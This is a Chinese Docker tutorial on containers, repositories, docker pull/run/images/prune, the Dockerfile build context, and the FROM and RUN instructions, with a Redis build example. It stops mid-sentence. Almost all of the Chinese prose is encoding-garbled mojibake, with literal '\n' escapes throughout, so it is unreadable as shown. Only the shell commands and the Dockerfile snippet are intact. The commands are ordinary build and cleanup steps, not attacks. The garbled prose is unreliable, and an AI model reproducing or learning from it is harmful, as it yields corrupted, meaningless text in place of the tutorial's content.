å®¹å™¨\n\næ¯ä¸€ä¸ªå®¹å™¨è¿è¡Œæ—¶ï¼Œæ˜¯ä»¥é•œåƒä¸ºåŸºç¡€å±‚ï¼Œåœ¨å…¶ä¸Šåˆ›å»ºä¸€ä¸ªå½“å‰å®¹å™¨çš„å­˜å‚¨å±‚ï¼Œæˆ‘ä»¬å¯ä»¥ç§°è¿™ä¸ªä¸ºå®¹å™¨è¿è¡Œæ—¶è¯»å†™è€Œå‡†å¤‡çš„å­˜å‚¨å±‚ä¸ºå®¹å™¨å­˜å‚¨å±‚ã€‚\n\n\n\nå®¹å™¨ä¸åº”è¯¥å‘å…¶å­˜å‚¨å±‚å†…å†™å…¥ä»»ä½•æ•°æ®ï¼Œå®¹å™¨å­˜å‚¨å±‚è¦ä¿æŒæ— çŠ¶æ€åŒ–ã€‚æ‰€æœ‰çš„æ–‡ä»¶å†™å…¥æ“ä½œï¼Œéƒ½åº”è¯¥ä½¿ç”¨ æ•°æ®å·ï¼ˆVolumeï¼‰ã€æˆ–è€…ç»‘å®šå®¿ä¸»ç›®å½•ï¼Œåœ¨è¿™äº›ä½ç½®çš„è¯»å†™ä¼šè·³è¿‡å®¹å™¨å­˜å‚¨å±‚ï¼Œç›´æ¥å¯¹å®¿ä¸»ï¼ˆæˆ–ç½‘ç»œå­˜å‚¨ï¼‰å‘ç”Ÿè¯»å†™ï¼Œå…¶æ€§èƒ½å’Œç¨³å®šæ€§æ›´é«˜ã€‚\n\næ•°æ®å·çš„ç”Ÿå­˜å‘¨æœŸç‹¬ç«‹äºå®¹å™¨ï¼Œå®¹å™¨æ¶ˆäº¡ï¼Œæ•°æ®å·ä¸ä¼šæ¶ˆäº¡ã€‚å› æ­¤ï¼Œä½¿ç”¨æ•°æ®å·åï¼Œå®¹å™¨åˆ é™¤æˆ–è€…é‡æ–°è¿è¡Œä¹‹åï¼Œæ•°æ®å´ä¸ä¼šä¸¢å¤±ã€‚\n\n<!-- more -->\n\n+ ä»“åº“\n\nä¸€ä¸ªä»“åº“ä¼šåŒ…å«åŒä¸€ä¸ªè½¯ä»¶ä¸åŒç‰ˆæœ¬çš„é•œåƒï¼Œè€Œæ ‡ç­¾å°±å¸¸ç”¨äºå¯¹åº”è¯¥è½¯ä»¶çš„å„ä¸ªç‰ˆæœ¬ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡Â `<ä»“åº“å>:<æ ‡ç­¾>`Â çš„æ ¼å¼æ¥æŒ‡å®šå…·ä½“æ˜¯è¿™ä¸ªè½¯ä»¶å“ªä¸ªç‰ˆæœ¬çš„é•œåƒã€‚å¦‚æœä¸ç»™å‡ºæ ‡ç­¾ï¼Œå°†ä»¥Â `latest`Â ä½œä¸ºé»˜è®¤æ ‡ç­¾ã€‚\n\n\n\nä»¥ Ubuntu é•œåƒ ä¸ºä¾‹ï¼Œ`ubuntu`Â æ˜¯ä»“åº“çš„åå­—ï¼Œå…¶å†…åŒ…å«æœ‰ä¸åŒçš„ç‰ˆæœ¬æ ‡ç­¾ï¼Œå¦‚ï¼Œ`14.04`,Â `16.04`ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡Â `ubuntu:14.04`ï¼Œæˆ–è€…Â `ubuntu:16.04`Â æ¥å…·ä½“æŒ‡å®šæ‰€éœ€å“ªä¸ªç‰ˆæœ¬çš„é•œåƒã€‚å¦‚æœå¿½ç•¥äº†æ ‡ç­¾ï¼Œæ¯”å¦‚Â `ubuntu`ï¼Œé‚£å°†è§†ä¸ºÂ `ubuntu:latest`ã€‚\n\n\n\nä»“åº“åç»å¸¸ä»¥Â *ä¸¤æ®µå¼è·¯å¾„*Â å½¢å¼å‡ºç°ï¼Œæ¯”å¦‚Â `jwilder/nginx-proxy`ï¼Œå‰è€…å¾€å¾€æ„å‘³ç€ Docker Registry å¤šç”¨æˆ·ç¯å¢ƒä¸‹çš„ç”¨æˆ·åï¼Œåè€…åˆ™å¾€å¾€æ˜¯å¯¹åº”çš„è½¯ä»¶åã€‚ä½†è¿™å¹¶éç»å¯¹ï¼Œå–å†³äºæ‰€ä½¿ç”¨çš„å…·ä½“ Docker Registry çš„è½¯ä»¶æˆ–æœåŠ¡ã€‚\n\n\n\n# 1. ä½¿ç”¨é•œåƒ\n\n1.1 è·å–é•œåƒ\n\n```\ndocker pull [é€‰é¡¹] [Docker Registry åœ°å€[:ç«¯å£å·]/]ä»“åº“å[:æ ‡ç­¾]\n```\n\n- Docker é•œåƒä»“åº“åœ°å€ï¼šåœ°å€çš„æ ¼å¼ä¸€èˆ¬æ˜¯ `<åŸŸå/IP>[:ç«¯å£å·]`ã€‚é»˜è®¤åœ°å€æ˜¯ Docker Hubã€‚\n- ä»“åº“åï¼šå¦‚ä¹‹å‰æ‰€è¯´ï¼Œè¿™é‡Œçš„ä»“åº“åæ˜¯ä¸¤æ®µå¼åç§°ï¼Œå³ `<ç”¨æˆ·å>/<è½¯ä»¶å>`ã€‚å¯¹äº Docker Hubï¼Œå¦‚æœä¸ç»™å‡ºç”¨æˆ·åï¼Œåˆ™é»˜è®¤ä¸º `library`ï¼Œä¹Ÿå°±æ˜¯å®˜æ–¹é•œåƒã€‚\n\n```\ndocker pull ubuntu:16.04\n16.04: Pulling from library/ubuntu\n```\n\n\n\n1.2 è¿è¡Œå®¹å™¨\n\n```\ndocker run -it --rm \\\n    ubuntu:16.04 \\\n    bash\n```\n\n- `-it`ï¼šè¿™æ˜¯ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ `-i`ï¼šäº¤äº’å¼æ“ä½œï¼Œä¸€ä¸ªæ˜¯ `-t` ç»ˆç«¯ã€‚æˆ‘ä»¬è¿™é‡Œæ‰“ç®—è¿›å…¥ `bash` æ‰§è¡Œä¸€äº›å‘½ä»¤å¹¶æŸ¥çœ‹è¿”å›ç»“æœï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦äº¤äº’å¼ç»ˆç«¯ã€‚\n- `--rm`ï¼šè¿™ä¸ªå‚æ•°æ˜¯è¯´å®¹å™¨é€€å‡ºåéšä¹‹å°†å…¶åˆ é™¤ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸ºäº†æ’éšœéœ€æ±‚ï¼Œé€€å‡ºçš„å®¹å™¨å¹¶ä¸ä¼šç«‹å³åˆ é™¤ï¼Œé™¤éæ‰‹åŠ¨ `docker rm`ã€‚æˆ‘ä»¬è¿™é‡Œåªæ˜¯éšä¾¿æ‰§è¡Œä¸ªå‘½ä»¤ï¼Œçœ‹çœ‹ç»“æœï¼Œä¸éœ€è¦æ’éšœå’Œä¿ç•™ç»“æœï¼Œå› æ­¤ä½¿ç”¨ `--rm` å¯ä»¥é¿å…æµªè´¹ç©ºé—´ã€‚\n- `ubuntu:16.04`ï¼šè¿™æ˜¯æŒ‡ç”¨ `ubuntu:16.04` é•œåƒä¸ºåŸºç¡€æ¥å¯åŠ¨å®¹å™¨ã€‚\n- `bash`ï¼šæ”¾åœ¨é•œåƒååçš„æ˜¯**å‘½ä»¤**ï¼Œè¿™é‡Œæˆ‘ä»¬å¸Œæœ›æœ‰ä¸ªäº¤äº’å¼ Shellï¼Œå› æ­¤ç”¨çš„æ˜¯ `bash`\n\n\n\n1.3 åˆ—å‡ºé•œåƒ\n\n```\ndocker images\n```\n\nåˆ—è¡¨åŒ…å«äº† `ä»“åº“å`ã€`æ ‡ç­¾`ã€`é•œåƒ ID`ã€`åˆ›å»ºæ—¶é—´` ä»¥åŠ `æ‰€å ç”¨çš„ç©ºé—´`ã€‚\n\n**é•œåƒ ID** åˆ™æ˜¯é•œåƒçš„å”¯ä¸€æ ‡è¯†ï¼Œä¸€ä¸ªé•œåƒå¯ä»¥å¯¹åº”å¤šä¸ª**æ ‡ç­¾**ã€‚\n\n\n\n1.4 è™šæ‚¬é•œåƒ\n\nÂ `docker pull`Â å¯èƒ½å¯¼è‡´è¿™ç§æƒ…å†µï¼Œ`docker build`Â ä¹ŸåŒæ ·å¯ä»¥å¯¼è‡´è¿™ç§ç°è±¡ã€‚ç”±äºæ–°æ—§é•œåƒåŒåï¼Œæ—§é•œåƒåç§°è¢«å–æ¶ˆï¼Œä»è€Œå‡ºç°ä»“åº“åã€æ ‡ç­¾å‡ä¸ºÂ `<none>`Â çš„é•œåƒã€‚è¿™ç±»æ— æ ‡ç­¾é•œåƒä¹Ÿè¢«ç§°ä¸ºÂ **è™šæ‚¬é•œåƒ(dangling image)**\n\n\n\nä¸€èˆ¬æ¥è¯´ï¼Œè™šæ‚¬é•œåƒå·²ç»å¤±å»äº†å­˜åœ¨çš„ä»·å€¼ï¼Œæ˜¯å¯ä»¥éšæ„åˆ é™¤çš„ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤åˆ é™¤ã€‚\n\n```\ndocker image prune\n```\n\n\n\n1.4 åˆ é™¤æœ¬åœ°é•œåƒ\n\nå¦‚æœè¦åˆ é™¤æœ¬åœ°çš„é•œåƒï¼Œå¯ä»¥ä½¿ç”¨ `docker image rm` å‘½ä»¤ï¼Œå…¶æ ¼å¼ä¸ºï¼š\n\n```\n$ docker image rm [é€‰é¡¹] <é•œåƒ1> [<é•œåƒ2> ...]\n```\n\n####  \n\n# 2. Dockerfile å®šåˆ¶é•œåƒ\n\nDockerfile æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶å†…åŒ…å«äº†ä¸€æ¡æ¡çš„**æŒ‡ä»¤(Instruction)**ï¼Œæ¯ä¸€æ¡æŒ‡ä»¤æ„å»ºä¸€å±‚ï¼Œå› æ­¤æ¯ä¸€æ¡æŒ‡ä»¤çš„å†…å®¹ï¼Œå°±æ˜¯æè¿°è¯¥å±‚åº”å½“å¦‚ä½•æ„å»ºã€‚\n\n\n\n2.1 æ„å»ºé•œåƒ\n\nåœ¨Â `Dockerfile`Â æ–‡ä»¶æ‰€åœ¨ç›®å½•æ‰§è¡Œï¼š\n\n```\n$ docker build -t nginx:v3 .\n```\n\n\n\nè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº† `docker build` å‘½ä»¤è¿›è¡Œé•œåƒæ„å»ºã€‚å…¶æ ¼å¼ä¸ºï¼š\n\n```\ndocker build [é€‰é¡¹] <ä¸Šä¸‹æ–‡è·¯å¾„/URL/->\n```\n\n\n\n2.2 é•œåƒæ„å»ºä¸Šä¸‹æ–‡ï¼ˆContextï¼‰ ä¸Šä¸‹æ–‡è·¯å¾„å°±æ˜¯ docker build æŒ‡å®šçš„\n\nå¦‚æœæ³¨æ„ï¼Œä¼šçœ‹åˆ°Â `docker build`Â å‘½ä»¤æœ€åæœ‰ä¸€ä¸ªÂ `.`ã€‚`.`Â è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œè€ŒÂ `Dockerfile`Â å°±åœ¨å½“å‰ç›®å½•ï¼Œå› æ­¤ä¸å°‘åˆå­¦è€…ä»¥ä¸ºè¿™ä¸ªè·¯å¾„æ˜¯åœ¨æŒ‡å®šÂ `Dockerfile`Â æ‰€åœ¨è·¯å¾„ï¼Œè¿™ä¹ˆç†è§£å…¶å®æ˜¯ä¸å‡†ç¡®çš„ã€‚å¦‚æœå¯¹åº”ä¸Šé¢çš„å‘½ä»¤æ ¼å¼ï¼Œä½ å¯èƒ½ä¼šå‘ç°ï¼Œè¿™æ˜¯åœ¨æŒ‡å®š**ä¸Šä¸‹æ–‡è·¯å¾„**ã€‚é‚£ä¹ˆä»€ä¹ˆæ˜¯ä¸Šä¸‹æ–‡å‘¢ï¼Ÿ\n\n\n\né¦–å…ˆæˆ‘ä»¬è¦ç†è§£ `docker build` çš„å·¥ä½œåŸç†ã€‚Docker åœ¨è¿è¡Œæ—¶åˆ†ä¸º Docker å¼•æ“ï¼ˆä¹Ÿå°±æ˜¯æœåŠ¡ç«¯å®ˆæŠ¤è¿›ç¨‹ï¼‰å’Œå®¢æˆ·ç«¯å·¥å…·ã€‚Docker çš„å¼•æ“æä¾›äº†ä¸€ç»„ REST APIï¼Œè¢«ç§°ä¸º Docker Remote APIï¼Œè€Œå¦‚ docker å‘½ä»¤è¿™æ ·çš„å®¢æˆ·ç«¯å·¥å…·ï¼Œåˆ™æ˜¯é€šè¿‡è¿™ç»„ API ä¸ Docker å¼•æ“äº¤äº’ï¼Œä»è€Œå®Œæˆå„ç§åŠŸèƒ½ã€‚å› æ­¤ï¼Œè™½ç„¶è¡¨é¢ä¸Šæˆ‘ä»¬å¥½åƒæ˜¯åœ¨æœ¬æœºæ‰§è¡Œå„ç§ `docker` åŠŸèƒ½ï¼Œä½†å®é™…ä¸Šï¼Œä¸€åˆ‡éƒ½æ˜¯ä½¿ç”¨çš„è¿œç¨‹è°ƒç”¨å½¢å¼åœ¨æœåŠ¡ç«¯ï¼ˆDocker å¼•æ“ï¼‰å®Œæˆã€‚ä¹Ÿå› ä¸ºè¿™ç§ C/S è®¾è®¡ï¼Œè®©æˆ‘ä»¬æ“ä½œè¿œç¨‹æœåŠ¡å™¨çš„ Docker å¼•æ“å˜å¾—è½»è€Œæ˜“ä¸¾ã€‚\n\n\n\nå½“æˆ‘ä»¬è¿›è¡Œé•œåƒæ„å»ºçš„æ—¶å€™ï¼Œå¹¶éæ‰€æœ‰å®šåˆ¶éƒ½ä¼šé€šè¿‡ `RUN` æŒ‡ä»¤å®Œæˆï¼Œç»å¸¸ä¼šéœ€è¦å°†ä¸€äº›æœ¬åœ°æ–‡ä»¶å¤åˆ¶è¿›é•œåƒï¼Œæ¯”å¦‚é€šè¿‡ `COPY` æŒ‡ä»¤ã€`ADD` æŒ‡ä»¤ç­‰ã€‚è€Œ `docker build` å‘½ä»¤æ„å»ºé•œåƒï¼Œå…¶å®å¹¶éåœ¨æœ¬åœ°æ„å»ºï¼Œè€Œæ˜¯åœ¨æœåŠ¡ç«¯ï¼Œä¹Ÿå°±æ˜¯ Docker å¼•æ“ä¸­æ„å»ºçš„ã€‚é‚£ä¹ˆåœ¨è¿™ç§å®¢æˆ·ç«¯/æœåŠ¡ç«¯çš„æ¶æ„ä¸­ï¼Œå¦‚ä½•æ‰èƒ½è®©æœåŠ¡ç«¯è·å¾—æœ¬åœ°æ–‡ä»¶å‘¢ï¼Ÿ\n\n \n\nè¿™å°±å¼•å…¥äº†ä¸Šä¸‹æ–‡çš„æ¦‚å¿µã€‚å½“æ„å»ºçš„æ—¶å€™ï¼Œç”¨æˆ·ä¼šæŒ‡å®šæ„å»ºé•œåƒä¸Šä¸‹æ–‡çš„è·¯å¾„ï¼Œ`docker build`Â å‘½ä»¤å¾—çŸ¥è¿™ä¸ªè·¯å¾„åï¼Œä¼šå°†è·¯å¾„ä¸‹çš„æ‰€æœ‰å†…å®¹æ‰“åŒ…ï¼Œç„¶åä¸Šä¼ ç»™ Docker å¼•æ“ã€‚è¿™æ · Docker å¼•æ“æ”¶åˆ°è¿™ä¸ªä¸Šä¸‹æ–‡åŒ…åï¼Œå±•å¼€å°±ä¼šè·å¾—æ„å»ºé•œåƒæ‰€éœ€çš„ä¸€åˆ‡æ–‡ä»¶ã€‚\n\n\n\nå¦‚æœåœ¨ `Dockerfile` ä¸­è¿™ä¹ˆå†™ï¼š\n\n```\nCOPY ./package.json /app/ \n```\n\nè¿™å¹¶ä¸æ˜¯è¦å¤åˆ¶æ‰§è¡Œ `docker build` å‘½ä»¤æ‰€åœ¨çš„ç›®å½•ä¸‹çš„ `package.json`ï¼Œä¹Ÿä¸æ˜¯å¤åˆ¶ `Dockerfile` æ‰€åœ¨ç›®å½•ä¸‹çš„ `package.json`ï¼Œè€Œæ˜¯å¤åˆ¶ **ä¸Šä¸‹æ–‡ï¼ˆcontextï¼‰** ç›®å½•ä¸‹çš„ `package.json`ã€‚\n\n \n\nå› æ­¤ï¼Œ`COPY`Â è¿™ç±»æŒ‡ä»¤ä¸­çš„æºæ–‡ä»¶çš„è·¯å¾„éƒ½æ˜¯*ç›¸å¯¹è·¯å¾„*ã€‚è¿™ä¹Ÿæ˜¯åˆå­¦è€…ç»å¸¸ä¼šé—®çš„ä¸ºä»€ä¹ˆÂ `COPY ../package.json /app`Â æˆ–è€…Â `COPY /opt/xxxx /app`Â æ— æ³•å·¥ä½œçš„åŸå› ï¼Œå› ä¸ºè¿™äº›è·¯å¾„å·²ç»è¶…å‡ºäº†ä¸Šä¸‹æ–‡çš„èŒƒå›´ï¼ŒDocker å¼•æ“æ— æ³•è·å¾—è¿™äº›ä½ç½®çš„æ–‡ä»¶ã€‚å¦‚æœçœŸçš„éœ€è¦é‚£äº›æ–‡ä»¶ï¼Œåº”è¯¥å°†å®ƒä»¬å¤åˆ¶åˆ°ä¸Šä¸‹æ–‡ç›®å½•ä¸­å»ã€‚\n\n\n\nç°åœ¨å°±å¯ä»¥ç†è§£åˆšæ‰çš„å‘½ä»¤ `docker build -t nginx:v3 .` ä¸­çš„è¿™ä¸ª `.`ï¼Œå®é™…ä¸Šæ˜¯åœ¨æŒ‡å®šä¸Šä¸‹æ–‡çš„ç›®å½•ï¼Œ`docker build` å‘½ä»¤ä¼šå°†è¯¥ç›®å½•ä¸‹çš„å†…å®¹æ‰“åŒ…äº¤ç»™ Docker å¼•æ“ä»¥å¸®åŠ©æ„å»ºé•œåƒã€‚\n\n\n\n ç†è§£æ„å»ºä¸Šä¸‹æ–‡å¯¹äºé•œåƒæ„å»ºæ˜¯å¾ˆé‡è¦çš„ï¼Œé¿å…çŠ¯ä¸€äº›ä¸åº”è¯¥çš„é”™è¯¯ã€‚æ¯”å¦‚æœ‰äº›åˆå­¦è€…åœ¨å‘ç° `COPY /opt/xxxx /app` ä¸å·¥ä½œåï¼Œäºæ˜¯å¹²è„†å°† `Dockerfile` æ”¾åˆ°äº†ç¡¬ç›˜æ ¹ç›®å½•å»æ„å»ºï¼Œç»“æœå‘ç° `docker build` æ‰§è¡Œåï¼Œåœ¨å‘é€ä¸€ä¸ªå‡ å GB çš„ä¸œè¥¿ï¼Œæä¸ºç¼“æ…¢è€Œä¸”å¾ˆå®¹æ˜“æ„å»ºå¤±è´¥ã€‚é‚£æ˜¯å› ä¸ºè¿™ç§åšæ³•æ˜¯åœ¨è®© `docker build` æ‰“åŒ…æ•´ä¸ªç¡¬ç›˜ï¼Œè¿™æ˜¾ç„¶æ˜¯ä½¿ç”¨é”™è¯¯ã€‚\n\n\n\nä¸€èˆ¬æ¥è¯´ï¼Œåº”è¯¥ä¼šå°†Â `Dockerfile`Â ç½®äºä¸€ä¸ªç©ºç›®å½•ä¸‹ï¼Œæˆ–è€…é¡¹ç›®æ ¹ç›®å½•ä¸‹ã€‚å¦‚æœè¯¥ç›®å½•ä¸‹æ²¡æœ‰æ‰€éœ€æ–‡ä»¶ï¼Œé‚£ä¹ˆåº”è¯¥æŠŠæ‰€éœ€æ–‡ä»¶å¤åˆ¶ä¸€ä»½è¿‡æ¥ã€‚å¦‚æœç›®å½•ä¸‹æœ‰äº›ä¸œè¥¿ç¡®å®ä¸å¸Œæœ›æ„å»ºæ—¶ä¼ ç»™ Docker å¼•æ“ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨Â `.gitignore`Â ä¸€æ ·çš„è¯­æ³•å†™ä¸€ä¸ªÂ `.dockerignore`ï¼Œè¯¥æ–‡ä»¶æ˜¯ç”¨äºå‰”é™¤ä¸éœ€è¦ä½œä¸ºä¸Šä¸‹æ–‡ä¼ é€’ç»™ Docker å¼•æ“çš„ã€‚ \n\n\n\né‚£ä¹ˆä¸ºä»€ä¹ˆä¼šæœ‰äººè¯¯ä»¥ä¸º `.` æ˜¯æŒ‡å®š `Dockerfile` æ‰€åœ¨ç›®å½•å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸é¢å¤–æŒ‡å®š `Dockerfile` çš„è¯ï¼Œä¼šå°†ä¸Šä¸‹æ–‡ç›®å½•ä¸‹çš„åä¸º `Dockerfile` çš„æ–‡ä»¶ä½œä¸º Dockerfileã€‚\n\n\n\nè¿™åªæ˜¯é»˜è®¤è¡Œä¸ºï¼Œå®é™…ä¸Š `Dockerfile` çš„æ–‡ä»¶åå¹¶ä¸è¦æ±‚å¿…é¡»ä¸º `Dockerfile`ï¼Œè€Œä¸”å¹¶ä¸è¦æ±‚å¿…é¡»ä½äºä¸Šä¸‹æ–‡ç›®å½•ä¸­ï¼Œæ¯”å¦‚å¯ä»¥ç”¨ `-f ../Dockerfile.php` å‚æ•°æŒ‡å®šæŸä¸ªæ–‡ä»¶ä½œä¸º `Dockerfile`ã€‚\n\n \n\nå½“ç„¶ï¼Œä¸€èˆ¬å¤§å®¶ä¹ æƒ¯æ€§çš„ä¼šä½¿ç”¨é»˜è®¤çš„æ–‡ä»¶å `Dockerfile`ï¼Œä»¥åŠä¼šå°†å…¶ç½®äºé•œåƒæ„å»ºä¸Šä¸‹æ–‡ç›®å½•ä¸­ã€‚\n\n\n\n\n\n2.3 dockerfile æŒ‡ä»¤\n\n\n\n+ FROM æŒ‡å®šåŸºç¡€é•œåƒ\n\næ‰€è°“å®šåˆ¶é•œåƒï¼Œé‚£ä¸€å®šæ˜¯ä»¥ä¸€ä¸ªé•œåƒä¸ºåŸºç¡€ï¼Œåœ¨å…¶ä¸Šè¿›è¡Œå®šåˆ¶ã€‚å°±åƒæˆ‘ä»¬ä¹‹å‰è¿è¡Œäº†ä¸€ä¸ªÂ `nginx`Â é•œåƒçš„å®¹å™¨ï¼Œå†è¿›è¡Œä¿®æ”¹ä¸€æ ·ï¼ŒåŸºç¡€é•œåƒæ˜¯å¿…é¡»æŒ‡å®šçš„ã€‚è€ŒÂ `FROM`Â å°±æ˜¯æŒ‡å®š**åŸºç¡€é•œåƒ**ï¼Œå› æ­¤ä¸€ä¸ªÂ `Dockerfile`Â ä¸­Â `FROM`Â æ˜¯å¿…å¤‡çš„æŒ‡ä»¤ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯ç¬¬ä¸€æ¡æŒ‡ä»¤ã€‚\n\nåœ¨ Docker Store ä¸Šæœ‰éå¸¸å¤šçš„é«˜è´¨é‡çš„å®˜æ–¹é•œåƒï¼Œæœ‰å¯ä»¥ç›´æ¥æ‹¿æ¥ä½¿ç”¨çš„æœåŠ¡ç±»çš„é•œåƒï¼Œå¦‚ nginxã€redisã€mongoã€mysqlã€httpdã€phpã€tomcat ç­‰ï¼›ä¹Ÿæœ‰ä¸€äº›æ–¹ä¾¿å¼€å‘ã€æ„å»ºã€è¿è¡Œå„ç§è¯­è¨€åº”ç”¨çš„é•œåƒï¼Œå¦‚ nodeã€openjdkã€pythonã€rubyã€golang ç­‰ã€‚å¯ä»¥åœ¨å…¶ä¸­å¯»æ‰¾ä¸€ä¸ªæœ€ç¬¦åˆæˆ‘ä»¬æœ€ç»ˆç›®æ ‡çš„é•œåƒä¸ºåŸºç¡€é•œåƒè¿›è¡Œå®šåˆ¶ã€‚\n\n\n\nå¦‚æœæ²¡æœ‰æ‰¾åˆ°å¯¹åº”æœåŠ¡çš„é•œåƒï¼Œå®˜æ–¹é•œåƒä¸­è¿˜æä¾›äº†ä¸€äº›æ›´ä¸ºåŸºç¡€çš„æ“ä½œç³»ç»Ÿé•œåƒï¼Œå¦‚ ubuntuã€debianã€centosã€fedoraã€alpine ç­‰ï¼Œè¿™äº›æ“ä½œç³»ç»Ÿçš„è½¯ä»¶åº“ä¸ºæˆ‘ä»¬æä¾›äº†æ›´å¹¿é˜”çš„æ‰©å±•ç©ºé—´ã€‚\n\né™¤äº†é€‰æ‹©ç°æœ‰é•œåƒä¸ºåŸºç¡€é•œåƒå¤–ï¼ŒDocker è¿˜å­˜åœ¨ä¸€ä¸ªç‰¹æ®Šçš„é•œåƒï¼Œåä¸º scratchã€‚è¿™ä¸ªé•œåƒæ˜¯è™šæ‹Ÿçš„æ¦‚å¿µï¼Œå¹¶ä¸å®é™…å­˜åœ¨ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªç©ºç™½çš„é•œåƒã€‚\n\n+ RUN æ‰§è¡Œå‘½ä»¤\n\n`RUN` æŒ‡ä»¤æ˜¯ç”¨æ¥æ‰§è¡Œå‘½ä»¤è¡Œå‘½ä»¤çš„ã€‚ç”±äºå‘½ä»¤è¡Œçš„å¼ºå¤§èƒ½åŠ›ï¼Œ`RUN` æŒ‡ä»¤åœ¨å®šåˆ¶é•œåƒæ—¶æ˜¯æœ€å¸¸ç”¨çš„æŒ‡ä»¤ä¹‹ä¸€ã€‚å…¶æ ¼å¼æœ‰ä¸¤ç§ï¼š\n\n\n+ shell æ ¼å¼ï¼š`RUN <å‘½ä»¤>`ï¼Œå°±åƒç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥çš„å‘½ä»¤ä¸€æ ·ã€‚åˆšæ‰å†™çš„ Dockerfile ä¸­çš„ `RUN` æŒ‡ä»¤å°±æ˜¯è¿™ç§æ ¼å¼ã€‚\n\n```\nRUN echo '<h1>Hello, Docker!</h1>' > /usr/share/nginx/html/index.html\n```\n\n- exec æ ¼å¼ï¼š`RUN [\"å¯æ‰§è¡Œæ–‡ä»¶\", \"å‚æ•°1\", \"å‚æ•°2\"]`ï¼Œè¿™æ›´åƒæ˜¯å‡½æ•°è°ƒç”¨ä¸­çš„æ ¼å¼ã€‚\n\n \n\nä¹‹å‰è¯´è¿‡ï¼ŒDockerfile ä¸­æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šå»ºç«‹ä¸€å±‚ï¼Œ`RUN` ä¹Ÿä¸ä¾‹å¤–ã€‚æ¯ä¸€ä¸ª `RUN` çš„è¡Œä¸ºï¼Œå°±å’Œåˆšæ‰æˆ‘ä»¬æ‰‹å·¥å»ºç«‹é•œåƒçš„è¿‡ç¨‹ä¸€æ ·ï¼šæ–°å»ºç«‹ä¸€å±‚ï¼Œåœ¨å…¶ä¸Šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œæ‰§è¡Œç»“æŸåï¼Œ`commit` è¿™ä¸€å±‚çš„ä¿®æ”¹ï¼Œæ„æˆæ–°çš„é•œåƒã€‚\n\n\n\n```\nFROM debian:jessie\n\nRUN buildDeps='gcc libc6-dev make' \\\n    && apt-get update \\\n    && apt-get install -y $buildDeps \\\n    && wget -O redis.tar.gz \"http://download.redis.io/releases/redis-3.2.5.tar.gz\" \\\n    && mkdir -p /usr/src/redis \\\n    && tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \\\n    && make -C /usr/src/redis \\\n    && make -C /usr/src/redis install \\\n    && rm -rf /var/lib/apt/lists/* \\\n    && rm redis.tar.gz \\\n    && rm -r /usr/src/redis \\\n    && apt-get purge -y --auto-remove $buildDeps\n```\n\n\n\n é¦–å…ˆï¼Œä¹‹å‰æ‰€æœ‰çš„å‘½ä»¤åªæœ‰ä¸€ä¸ªç›®çš„ï¼Œå°±æ˜¯ç¼–è¯‘ã€å®‰è£… redis å¯æ‰§è¡Œæ–‡ä»¶ã€‚å› æ­¤æ²¡æœ‰å¿…è¦å»ºç«‹å¾ˆå¤šå±‚ï¼Œè¿™åªæ˜¯ä¸€å±‚çš„äº‹æƒ…ã€‚å› æ­¤ï¼Œè¿™é‡Œæ²¡æœ‰ä½¿ç”¨å¾ˆå¤šä¸ª `RUN` å¯¹ä¸€ä¸€å¯¹åº”ä¸åŒçš„å‘½ä»¤ï¼Œè€Œæ˜¯ä»…ä»…ä½¿ç”¨ä¸€ä¸ª `RUN` æŒ‡ä»¤ï¼Œå¹¶ä½¿ç”¨ `&&` å°†å„ä¸ªæ‰€éœ€å‘½ä»¤ä¸²è”èµ·æ¥ã€‚å°†ä¹‹å‰çš„ 7 å±‚ï¼Œç®€åŒ–ä¸ºäº† 1 å±‚ã€‚åœ¨æ’°å†™ Dockerfile çš„æ—¶å€™ï¼Œè¦ç»å¸¸æé†’è‡ªå·±ï¼Œè¿™å¹¶ä¸æ˜¯åœ¨å†™ Shell è„šæœ¬ï¼Œè€Œæ˜¯åœ¨å®šä¹‰æ¯ä¸€å±‚è¯¥å¦‚ä½•æ„å»ºã€‚\n\n\n\nå¹¶ä¸”ï¼Œè¿™é‡Œä¸ºäº†æ ¼å¼åŒ–è¿˜è¿›è¡Œäº†æ¢è¡Œã€‚Dockerfile æ”¯æŒ Shell ç±»çš„è¡Œå°¾æ·»åŠ  `\\` çš„å‘½ä»¤æ¢è¡Œæ–¹å¼ï¼Œä»¥åŠè¡Œé¦– `#` è¿›è¡Œæ³¨é‡Šçš„æ ¼å¼ã€‚è‰¯å¥½çš„æ ¼å¼ï¼Œæ¯”å¦‚æ¢è¡Œã€ç¼©è¿›ã€æ³¨é‡Šç­‰ï¼Œä¼šè®©ç»´æŠ¤ã€æ’éšœæ›´ä¸ºå®¹æ˜“ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„ä¹ æƒ¯ã€‚\n\n  \n\næ­¤å¤–ï¼Œè¿˜å¯ä»¥çœ‹åˆ°è¿™ä¸€ç»„å‘½ä»¤çš„æœ€åæ·»åŠ äº†æ¸…ç†å·¥ä½œçš„å‘½ä»¤ï¼Œåˆ é™¤äº†ä¸ºäº†ç¼–è¯‘æ„å»ºæ‰€éœ€è¦çš„è½¯ä»¶ï¼Œæ¸…ç†äº†æ‰€æœ‰ä¸‹è½½ã€å±•å¼€çš„æ–‡ä»¶ï¼Œå¹¶ä¸”è¿˜æ¸…ç†äº† `apt` 